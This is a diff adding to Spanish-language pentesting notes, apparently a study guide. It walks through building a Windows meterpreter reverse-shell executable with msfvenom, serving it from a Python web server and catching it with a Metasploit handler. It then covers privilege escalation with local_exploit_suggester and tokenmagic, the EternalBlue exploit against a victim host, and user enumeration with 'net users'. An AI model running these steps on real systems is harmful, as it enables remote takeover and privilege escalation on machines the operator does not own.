@@ -84,6 +84,72 @@ env /bin/sh -p
 {% embed url="https://drive.google.com/file/d/11oWEHwqu9AOKNwBU483abdGhnxJaZKT5/view?usp=sharing" %}
 
 ```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP máquina atacante> LPORT=4444 -f exe -o virus.exe
+```
+
+Si no es de 64 bits.
+
+```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP máquina atacante> LPORT=4444 -f exe -o virus.exe
 ```
 
+Lo compartimos en un servidor en Python.
+
+```bash
+python3 -m http.server 80
+```
+
+Ponemos la IP en el buscador y nos descargamos el Python. Nos ponemos en escucha mediante **Metasploit**.
+
+```
+msfconsole
+use multi/handler
+show options
+set LHOST <IP máquina atacante>
+set PAYLOAD windows/meterpreter/reverse_tcp
+run 
+```
+
+Ejecutamos nuestro payload. Somos un usuario normal por lo que hay que escalar privilegios.
+
+```bash
+background 
+search local_exploit_suggester
+show options
+sessions -l
+set SESSION 1 
+run
+```
+
+Nos salen los exploits operativos pero hay que probar uno a uno.
+
+```bash
+use windows/local/tokenmagic
+show options
+set SESSION 1
+set LHOST <IP máquina atacante>
+set LPORT 5555
+run
+```
+
+## Enumeración de Usuarios en Sistemas Windows
+
+{% embed url="https://mega.nz/file/zIBTHZjT#IOsj05Xn0R4n7vlGy_gv0wvFJ1aZFT5uSW3nXK6KmD0" %}
+
+```bash
+msfconsole 
+search eternalblue 
+use 0
+show options
+set RHOSTS <IP máquina víctima>
+run
+```
+
+En meterpreter.
+
+```bash
+shell
+net users
+```
+
+El comando `net users` para poder ver los usuarios existentes dentro de un sistema Windows.
